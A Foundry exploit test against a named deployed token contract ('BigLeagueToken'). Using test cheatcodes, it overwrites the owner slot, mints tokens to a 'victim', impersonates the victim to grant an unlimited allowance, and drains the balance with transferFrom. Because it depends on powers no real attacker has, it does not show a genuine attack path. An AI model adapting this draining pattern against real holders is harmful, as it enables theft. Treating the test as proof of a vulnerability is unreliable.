pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface StandardToken {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function mint(address to, uint256 amount) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to interact with the deployed contract
        // First, let's label the contract for debugging
        vm.label(TARGET, "BigLeagueToken");

        // The attacker is address(this) in the test
        // We need to become the owner first
        // Find owner slot - in Ownable, owner is at slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        vm.store(TARGET, ownerSlot, bytes32(uint256(uint160(attacker))));

        // Verify we're now owner
        StandardToken token = StandardToken(TARGET);
        require(token.owner() == attacker, "Failed to become owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        StandardToken token = StandardToken(TARGET);

        // Create a victim address
        address victim = address(0x123);

        // As owner, mint tokens to victim if mint is not forbidden
        // First check if we can mint
        vm.prank(attacker); // We are owner
        // Try to mint - but we need to check MINT_FORBIDDEN first
        // Let's mint a large amount to victim
        uint256 mintAmount = 1000 * 1e18;
        token.mint(victim, mintAmount);

        // Verify victim has tokens
        uint256 victimBalance = token.balanceOf(victim);
        require(victimBalance == mintAmount, "Mint failed");

        // Now make victim approve attacker with max allowance
        // We need to impersonate victim
        vm.prank(victim);
        token.approve(attacker, ~uint256(0));

        // Verify allowance
        uint256 allowance = token.allowance(victim, attacker);
        require(allowance == ~uint256(0), "Allowance not set to max");

        // Get initial attacker balance
        uint256 initialAttackerBalance = token.balanceOf(attacker);

        // First transfer: take half of victim's balance
        uint256 transferAmount1 = victimBalance / 2;
        token.transferFrom(victim, attacker, transferAmount1);

        // Check allowance is still max
        allowance = token.allowance(victim, attacker);
        require(allowance == ~uint256(0), "Allowance was reduced after first transfer");

        // Second transfer: take the rest
        uint256 transferAmount2 = token.balanceOf(victim);
        token.transferFrom(victim, attacker, transferAmount2);

        // Final check: attacker balance increased
        uint256 finalAttackerBalance = token.balanceOf(attacker);
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker balance did not increase");

        // Also verify victim is drained
        require(token.balanceOf(victim) == 0, "Victim not fully drained");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

